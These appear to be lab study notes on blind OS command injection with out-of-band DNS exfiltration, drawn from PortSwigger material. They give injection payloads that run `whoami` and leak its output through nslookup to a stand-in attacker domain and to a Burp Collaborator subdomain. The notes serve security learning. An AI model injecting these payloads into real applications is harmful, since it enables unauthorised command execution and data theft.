# Out-of-Band Data Exfiltration

## Overview

Out-of-Band (OAST) techniques can be used not only to confirm command execution but also to retrieve the output of injected commands.

Instead of simply performing a DNS lookup, the application includes the command output within the DNS request itself.

---

# Example Payload

The PortSwigger material provides the following example:

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

The shell executes:

```bash
whoami
```

The command output becomes part of the requested domain name.

Example:

```text
wwwuser.kgji2ohoyw.web-attacker.com
```

---

# Lab Workflow

The PortSwigger lab uses Burp Collaborator.

Steps include:

1. Generate a Collaborator payload.
2. Insert the generated domain into the request.
3. Inject:

```text
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

4. Submit the request.
5. Poll Burp Collaborator.
6. View the resulting DNS interaction.

---

# Extracting the Result

The username returned by the `whoami` command appears within the DNS request.

This allows the tester to recover command output even though:

- The application returns no output.
- Files cannot be written.
- Commands execute asynchronously.

---

# Attack Workflow

```
Inject Payload

↓

Execute whoami

↓

Embed Output Into DNS Request

↓

DNS Lookup Sent

↓

Burp Collaborator Records Request

↓

Recover Command Output
```

---

# Advantages

- Retrieves command output without direct application responses.
- Effective when output redirection is unavailable.
- Useful for asynchronous command execution.

---

# Key Takeaways

- OAST can both confirm execution and retrieve command output.
- The command result becomes part of the DNS query.
- Burp Collaborator displays the received DNS interaction, allowing the tester to recover the output.